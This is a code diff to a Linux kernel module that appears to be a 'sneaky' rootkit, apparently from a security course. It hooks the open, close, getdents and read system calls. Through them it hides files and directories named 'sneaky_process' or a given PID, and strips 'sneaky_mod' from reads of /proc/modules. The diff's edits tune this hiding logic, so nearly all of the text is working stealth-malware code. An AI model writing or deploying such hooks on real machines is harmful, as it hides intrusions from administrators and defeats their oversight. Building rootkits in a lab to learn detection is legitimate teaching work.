@@ -24,7 +24,7 @@ struct linux_dirent {
 	char           d_name[BUFFLEN];
 };
 
-static int file_d = -1;
+static int file_flag = -1;
 
 static int process_id = 0;
 MODULE_LICENSE("GPL");
@@ -72,7 +72,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
 		}
 	} else {
 		if(strcmp(pathname, "/proc/modules") == 0) {
-			return (file_d = original_call(pathname, flags, mode));
+			return (file_flag = original_call(pathname, flags, mode));
 		}
 		else {
 			return original_call(pathname, flags, mode);
@@ -83,8 +83,8 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
 }
 
 asmlinkage int sneaky_sys_close(int fd){
-	if (file_d == fd) {
-		file_d = -1;
+	if (file_flag == fd) {
+		file_flag = -1;
 	}
 	return original_close(fd);
 }
@@ -92,7 +92,7 @@ asmlinkage int sneaky_sys_close(int fd){
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
 	int ret, cur;
 	struct linux_dirent *d;
-	char d_type;
+	//char d_type;
 	char temp_pid[128];
 	ret = original_getdents(fd, dirp, count);
 	d = (struct linux_dirent *)((char *)dirp);
@@ -100,9 +100,10 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 	//begin filter
 	for(cur = 0; cur < ret; cur += ((int)(d -> d_reclen))) {
 		d = (struct linux_dirent *) ((char *)dirp + cur);
-		d_type = *((char *) dirp + cur + d -> d_reclen - 1);
-		if(((d_type == DT_REG) && (strcmp(d->d_name, "sneaky_process") == 0)) || ((d_type == DT_DIR) && (strcmp(d -> d_name, temp_pid) == 0))) {
-			memcpy(d, (char *)d + d -> d_reclen, ret - (int)((((char *)d) + d -> d_reclen) - (char *) dirp));
+		//d_type = *((char *) dirp + cur + d -> d_reclen - 1);
+		//if(((d_type == DT_REG) && (strcmp(d->d_name, "sneaky_process") == 0)) || ((d_type == DT_DIR) && (strcmp(d -> d_name, temp_pid) == 0))) {
+		if((strcmp(d->d_name, "sneaky_process") == 0) || (strcmp(d -> d_name, temp_pid) == 0)) {		
+			memmove(d, (char *)d + d -> d_reclen, ret - (int)((((char *)d) + d -> d_reclen) - (char *) dirp));
 			ret -= (int)d -> d_reclen;
 		}
 	}
@@ -112,7 +113,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
 	ssize_t ret = original_read(fd, buf, count);
 	int size = 0;
-	if(file_d >= 0 && file_d == fd) {
+	if(file_flag >= 0 && file_flag == fd) {
 		char * begin = strstr(buf, "sneaky_mod");
 		if(begin != NULL) {
 			char * next = begin;
